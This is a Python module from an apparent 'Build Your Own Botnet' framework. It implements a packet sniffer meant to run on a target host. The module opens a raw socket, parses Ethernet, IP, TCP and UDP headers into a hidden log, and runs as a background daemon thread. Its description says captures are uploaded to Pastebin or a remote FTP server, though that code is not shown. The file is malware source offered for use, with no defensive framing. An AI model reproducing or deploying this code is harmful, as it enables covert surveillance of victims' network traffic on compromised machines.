#!/usr/bin/python
# -*- coding: utf-8 -*-
'Packet Sniffer (Build Your Own Botnet)'

# standard libarary
import time
import struct
import socket
import binascii
import threading

try:
    from StringIO import StringIO  # Python 2
except ImportError:
    from io import StringIO        # Python 3

# utilities
import util

# globals
packages = []
platforms = ['linux2','darwin']
results = {}
log = StringIO()
flag = threading.Event()
usage  = 'packetsniffer [mode]'
desription = """
Capture packets on the target client host machine's local network
and optionally upload them to Pastebin or to a remote FTP server
"""

# main
def _udp_header(data):
    try:
        udp_hdr = struct.unpack('!4H', data[:8])
        src = udp_hdr[0]
        dst = udp_hdr[1]
        length = udp_hdr[2]
        chksum = udp_hdr[3]
        data = data[8:]
        globals()['log'].write('\n================== UDP HEADER ==================')
        globals()['log'].write('\n================================================')
        globals()['log'].write('\n{:>20} ,  {}\t\t\t'.format('Source', src))
        globals()['log'].write('\n{:>20} ,  {}\t\t\t'.format('Dest', dst))
        globals()['log'].write('\n{:>20} ,  {}\t\t\t'.format('Length', length))
        globals()['log'].write('\n{:>20} ,  {}\t\t\t'.format('Check Sum', chksum))
        globals()['log'].write('\n================================================')
        return data
    except Exception as e:
        globals()['log'].write("\nError in {} header: '{}'".format('UDP', str(e)))

def _tcp_header(recv_data):
    try:
        tcp_hdr = struct.unpack('!2H2I4H', recv_data[:20])
        src_port = tcp_hdr[0]
        dst_port = tcp_hdr[1]
        seq_num = tcp_hdr[2]
        ack_num = tcp_hdr[3]
        data_ofs = tcp_hdr[4] >> 12
        reserved = (tcp_hdr[4] >> 6) & 0x03ff
        flags = tcp_hdr[4] & 0x003f
        flagdata = {
            'URG' : bool(flags & 0x0020),
            'ACK' : bool(flags & 0x0010),
            'PSH' : bool(flags & 0x0008),
            'RST' : bool(flags & 0x0004),
            'SYN' : bool(flags & 0x0002),
            'FIN' : bool(flags & 0x0001)
        }
        win = tcp_hdr[5]
        chk_sum = tcp_hdr[6]
        urg_pnt = tcp_hdr[7]
        recv_data = recv_data[20:]
        globals()['log'].write('\n================== TCP HEADER ==================')
        globals()['log'].write('\n================================================')
        globals()['log'].write('\n{:>20} ,  {}\t\t\t'.format('Source', src_port))
        globals()['log'].write('\n{:>20} ,  {}\t\t\t'.format('Target', dst_port))
        globals()['log'].write('\n{:>20} ,  {}\t\t\t'.format('Seq Num', seq_num))
        globals()['log'].write('\n{:>20} ,  {}\t\t'.format('Ack Num', ack_num))
        globals()['log'].write('\n{:>20} ,  {}\t\t'.format('Flags', ', '.join([flag for flag in flagdata if flagdata.get(flag)])))
        globals()['log'].write('\n{:>20} ,  {}\t\t\t'.format('Window', win))
        globals()['log'].write('\n{:>20} ,  {}\t\t\t'.format('Check Sum', chk_sum))
        globals()['log'].write('\n{:>20} ,  {}\t\t\t'.format('Urg Pnt', urg_pnt))
        globals()['log'].write('\n================================================')
        return recv_data
    except Exception as e:
        globals()['log'].write("\nError in {} header: '{}'".format('TCP', str(e)))

def _ip_header(data):
    try:
        ip_hdr = struct.unpack('!6H4s4s', data[:20])
        ver = ip_hdr[0] >> 12
        ihl = (ip_hdr[0] >> 8) & 0x0f
        tos = ip_hdr[0] & 0x00ff
        tot_len = ip_hdr[1]
        ip_id = ip_hdr[2]
        flags = ip_hdr[3] >> 13
        fragofs = ip_hdr[3] & 0x1fff
        ttl = ip_hdr[4] >> 8
        ipproto = ip_hdr[4] & 0x00ff
        chksum = ip_hdr[5]
        src = socket.inet_ntoa(ip_hdr[6])
        dest = socket.inet_ntoa(ip_hdr[7])
        data = data[20:]
        globals()['log'].write('\n================== IP HEADER ===================')
        globals()['log'].write('\n================================================')
        globals()['log'].write('\n{:>20} ,  {}\t\t\t'.format('VER', ver))
        globals()['log'].write('\n{:>20} ,  {}\t\t\t'.format('IHL', ihl))
        globals()['log'].write('\n{:>20} ,  {}\t\t\t'.format('TOS', tos))
        globals()['log'].write('\n{:>20} ,  {}\t\t\t'.format('Length', tot_len))
        globals()['log'].write('\n{:>20} ,  {}\t\t\t'.format('ID', ip_id))
        globals()['log'].write('\n{:>20} ,  {}\t\t\t'.format('Flags', flags))
        globals()['log'].write('\n{:>20} ,  {}\t\t\t'.format('Frag Offset', fragofs))
        globals()['log'].write('\n{:>20} ,  {}\t\t\t'.format('TTL', ttl))
        globals()['log'].write('\n{:>20} ,  {}\t\t\t'.format('Next Protocol', ipproto))
        globals()['log'].write('\n{:>20} ,  {}\t\t\t'.format('Check Sum', chksum))
        globals()['log'].write('\n{:>20} ,  {}\t\t'.format('Source IP', src))
        globals()['log'].write('\n{:>20} ,  {}\t\t'.format('Dest IP', dest))
        globals()['log'].write('\n================================================')
        return data, ipproto
    except Exception as e:
        globals()['log'].write("\nError in {} header: '{}'".format('IP', str(e)))


def _eth_header(data):
    try:
        ip_bool = False
        eth_hdr = struct.unpack('!6s6sH', data[:14])
        dst_mac = binascii.hexlify(eth_hdr[0])
        src_mac = binascii.hexlify(eth_hdr[1])
        proto = eth_hdr[2] >> 8
        globals()['log'].write('\n================================================')
        globals()['log'].write('\n================== ETH HEADER ==================')
        globals()['log'].write('\n================================================')
        globals()['log'].write('\n{:>20} ,  {}\t'.format('Target MAC', '{}:{}:{}:{}:{}:{}'.format(dst_mac[0:2],dst_mac[2:4],dst_mac[4:6],dst_mac[6:8],dst_mac[8:10],dst_mac[10:12])))
        globals()['log'].write('\n{:>20} ,  {}\t'.format('Source MAC', '{}:{}:{}:{}:{}:{}'.format(src_mac[0:2],src_mac[2:4],src_mac[4:6],src_mac[6:8],src_mac[8:10],src_mac[10:12])))
        globals()['log'].write('\n{:>20} ,  {}\t\t\t'.format('Protocol', proto))
        globals()['log'].write('\n================================================')
        if proto == 8:
            ip_bool = True
        data = data[14:]
        return data, ip_bool
    except Exception as e:
        globals()['log'].write("\nError in {} header: '{}'".format('ETH', str(e)))

def _run():
    global flag
    # try:
    sniffer_socket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
    while True:
#            flag.wait()
#            try:
        recv_data = sniffer_socket.recv(2048)
        recv_data, ip_bool = _eth_header(recv_data)
        if ip_bool:
            recv_data, ip_proto = _ip_header(recv_data)
            if ip_proto == 6:
                recv_data = _tcp_header(recv_data)
            elif ip_proto == 17:
                recv_data = _udp_header(recv_data)
#            except Exception as e:
#                util.log(str(e))
#                break
    try:
        sniffer_socket.close()
    except: pass
    # except Exception as e:
    #     util.log(str(e))


def run():
    """
    Monitor the host network and capture packets

    `Optional`
    :param int seconds:    duration in seconds (default: 30)

    """
    t = threading.Thread(target=_run, name=time.time())
    t.daemon = True
    t.start()
    return t
